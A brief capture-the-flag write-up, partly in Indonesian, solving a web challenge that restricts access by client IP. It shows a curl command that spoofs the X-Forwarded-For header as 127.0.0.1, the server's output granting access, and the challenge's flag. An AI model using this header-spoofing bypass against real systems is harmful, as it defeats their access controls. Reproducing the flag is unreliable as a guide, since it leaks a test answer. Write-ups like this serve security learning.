<h1><b>Whatz your IP</b></h1>
<pre>
<a href="http://hack.bckdr.in:16003/index.php">This</a> challenge is based on a simple kind of authentication. Go get the flag.
</pre>
<h3><b>Solution</b></h3>
<p>Jika kita mencoba request ke URL, maka akan ada pesan "Your IP address is xxx.xxx.xxx.57 Access Denied", yang artinya alamat kita ditolak oleh server,
, disini kita hanya perlu ganti header x-forwarded-for dengan ip 127.0.0.1</p>

```console
root@Python:/home/venom/Downloads# curl --header "X-Forwarded-For: 127.0.0.1" http://hack.bckdr.in:16003/index.php
Your IP address is 127.0.0.1<br>
Access granted. Flag is d025c4ca8e71501df3581d995c9d838801125d16b0468f6b980969d476b2ac55
root@Python:/home/venom/Downloads# 
```
<h3><b>Flag</b></h3>
<pre>
d025c4ca8e71501df3581d995c9d838801125d16b0468f6b980969d476b2ac55
</pre>
